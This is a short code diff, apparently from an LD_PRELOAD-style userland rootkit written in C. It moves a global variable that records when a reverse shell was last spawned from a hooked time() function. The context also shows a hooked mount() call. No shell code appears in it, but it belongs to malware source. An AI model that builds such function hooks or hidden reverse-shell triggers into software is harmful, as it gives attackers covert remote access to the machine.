@@ -48,6 +48,7 @@
 
 //global variables
 static char *libpath = NULL; //this pointer shouldn't ever be free because that breaks any function calls after the destructor is called
+static time_t last_time = 0; //time the last reverse shell was spawned, see time() hook
 
 
 //function declarations
@@ -1287,8 +1288,6 @@ int mount(const char *source, const char *target, const char *filesystemtype, un
     return (*original_mount)(source, target, filesystemtype, mountflags, data);
 }
 
-
-static time_t last_time = 0; //time the last reverse shell was spawned
 
 time_t time(time_t *tloc) {
     #if DEBUG
